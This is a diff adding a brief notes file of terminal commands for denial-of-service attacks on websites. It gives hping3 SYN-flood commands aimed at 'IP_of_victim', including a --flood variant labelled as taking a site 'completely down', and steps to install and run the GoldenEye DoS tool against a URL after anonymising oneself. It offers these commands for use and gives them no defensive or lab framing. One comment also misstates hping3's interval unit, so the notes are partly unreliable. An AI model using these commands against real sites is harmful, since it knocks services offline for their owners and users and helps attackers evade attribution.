@@ -1,0 +1,17 @@
+1) :::IN TERMINAL:::
+         hping3 --help                    //gives options
+
+2):::IN TERMINAL:::                   //basic attack to make website irresponsive:::
+        hping3 -i u100 -S -p 80  IP_of_victim                 //u -> interval //waits for 100 sec
+
+3):::IN TERMINAL:::                   //completely down
+        hping3 -S --flood -V IP_of_victim
+
+4) DOS attack GOLDENEYE::::
+       1) installing goldeneye::::
+                  :::in terminal:::
+                              apt-get install goldeneye
+       2) now anonymise yourself
+       3) useage::::
+              :::in terminal:::
+                     goldeneye URL               //URL of website here
